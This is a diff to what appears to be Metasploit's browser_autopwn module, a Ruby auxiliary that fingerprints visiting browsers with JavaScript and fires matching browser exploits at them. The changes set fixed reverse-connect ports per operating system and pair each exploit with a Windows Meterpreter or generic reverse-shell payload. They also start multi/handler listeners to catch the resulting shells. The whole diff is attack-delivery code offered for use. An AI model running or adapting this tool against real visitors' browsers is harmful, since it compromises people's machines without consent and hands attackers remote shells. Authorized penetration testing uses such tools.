@@ -13,12 +13,10 @@
 #	- add a loading page option so the user can specify arbitrary html to
 #	  insert all of the evil js and iframes into
 #	- caching is busted when different browsers come from the same IP
-#	- opera historysearch won't work in an iframe
 #	- some kind of version comparison for each browser
 #		- is a generic comparison possible?
 #			9.1 < 9.10 < 9.20b < 9.20
 #			3.5-pre < 3.5 < 3.5.1
-#	- 'Defanged' action that just prints out detection stuff
 
 require 'msf/core'
 require 'rex/exploitation/javascriptosdetect'
@@ -77,9 +75,22 @@ class Metasploit3 < Msf::Auxiliary
 				'Do not obfuscate the javascript and print various bits of useful info to the browser',
 				false
 			]),
+			OptPort.new('LPORT_WIN32', [false, 
+				'The port to use for Windows reverse-connect payloads, default is 3333'
+			]),
+			OptPort.new('LPORT_LINUX', [false, 
+				'The port to use for Linux reverse-connect payloads, default is 4444'
+			]),
+			OptPort.new('LPORT_MAC', [false, 
+				'The port to use for Mac reverse-connect payloads, default is 5555'
+			]),
+			OptPort.new('LPORT_GENERIC', [false, 
+				'The port to use for generic reverse-connect payloads, default is 6666'
+			]),
 		], self.class)
 
 		@exploits = Hash.new
+		@payloads = Hash.new
 		@targetcache = Hash.new
 	end
 
@@ -99,6 +110,9 @@ class Metasploit3 < Msf::Auxiliary
 		elsif (action.name == 'DefangedDetection')
 			exploit()
 		else 
+			if (!framework.db.active)
+				warn_no_database
+			end
 			start_exploit_modules()
 			if @exploits.length < 1
 				print_error("No exploits, check your MATCH and EXCLUDE settings")
@@ -116,6 +130,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			#{js_os_detect}
 			#{js_base64}
+
 			function make_xhr() {
 				var xhr;
 				try { 
@@ -209,6 +224,17 @@ class Metasploit3 < Msf::Auxiliary
 		@init_html << "</noscript> \n"
 		@init_html << "</body> </html> "
 
+		#
+		# I'm still not sold that this is the best way to do this, but random
+		# LPORTs causes confusion when things break and breakage when firewalls
+		# are in the way.  I think the ideal solution is to have
+		# self-identifying payloads so we'd only need 1 LPORT for multiple
+		# stagers.
+		#
+		@win_lport = datastore['LPORT_WIN32'] || 3333
+		@lin_lport = datastore['LPORT_LINUX'] || 4444
+		@osx_lport = datastore['LPORT_MACOS'] || 5555
+		@gen_lport = datastore['LPORT_GENERIC'] || 6666
 	end
 
 
@@ -222,10 +248,19 @@ class Metasploit3 < Msf::Auxiliary
 		case name
 		when %r{windows}
 			payload='windows/meterpreter/reverse_tcp'
-			#payload='generic/debug_trap'
+			lport = @win_lport
+		#when %r{linux}
+			# Some day...
+			#payload='linux/meterpreter/reverse_tcp'
+		#when %r{osx}
+			# Some day...
+			#payload='osx/meterpreter/reverse_tcp'
 		else
+			lport = @gen_lport
 			payload='generic/shell_reverse_tcp'
 		end	
+		@payloads[lport] = payload
+
 		print_status("Starting exploit #{name} with payload #{payload}")
 		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']
 
@@ -237,11 +272,10 @@ class Metasploit3 < Msf::Auxiliary
 			@exploits[name].datastore['URIPATH'] = nil  
 		end
 
-		# set a random lport for each exploit.  There's got to be a better way
-		# to do this but it's still better than incrementing it
-		@exploits[name].datastore['LPORT'] = rand(32768) + 32768
+		@exploits[name].datastore['LPORT'] = lport
 		@exploits[name].datastore['LHOST'] = @lhost
 		@exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
+		@exploits[name].datastore['DisablePayloadHandler'] = true
 		@exploits[name].exploit_simple(
 			'LocalInput'     => self.user_input,
 			'LocalOutput'    => self.user_output,
@@ -322,6 +356,25 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 		end
+		# start handlers for each type of payload
+		[@win_lport, @lin_lport, @osx_lport, @gen_lport].each do |lport|
+			if (lport and @payloads[lport])
+				print_status("Starting handler for #{@payloads[lport]} on port #{lport}")
+				multihandler = framework.modules.create("exploit/multi/handler")
+				multihandler.datastore['LPORT'] = lport
+				multihandler.datastore['LHOST'] = @lhost
+				multihandler.datastore['ExitOnSession'] = false
+				multihandler.datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
+				multihandler.exploit_simple(
+					'LocalInput'     => self.user_input,
+					'LocalOutput'    => self.user_output,
+					'Payload'        => @payloads[lport],
+					'RunAsJob'       => true)
+			end
+		end
+		# let the handlers get set up
+		Rex::ThreadSafe.sleep(0.5)
+
 		print_line
 		print_status("--- Done, found #{@exploits.length} exploit modules")
 		print_line
@@ -614,8 +667,12 @@ class Metasploit3 < Msf::Auxiliary
 		# If the database is not connected, use a cache instead.
 		# This is less reliable because we're not treating different user
 		# agents from the same IP as different hosts.
-		if (!get_client(cli.peerhost, request['User-Agent']))
-			print_status("No database, using targetcache instead")
+		if (framework.db.active)
+			# There really ought to be a report_client, instead of having
+			# get_client create a new one if it can't find one.
+			get_client(cli.peerhost, request['User-Agent'])
+		else
+			warn_no_database
 			@targetcache ||= {}
 			@targetcache[cli.peerhost] ||= {}
 			@targetcache[cli.peerhost][:update] = Time.now.to_i
@@ -673,6 +730,11 @@ class Metasploit3 < Msf::Auxiliary
 			return "document.body.innerHTML += #{msg};"
 		end
 		return ""
+	end
+	def warn_no_database
+		print_error("WARNING: Database is disabled, using targetcache instead.")
+		print_error("Database support makes detection much more reliable against multiple")
+		print_error("hosts from the same IP; type 'db_create' to enable it.")
 	end
 end
 
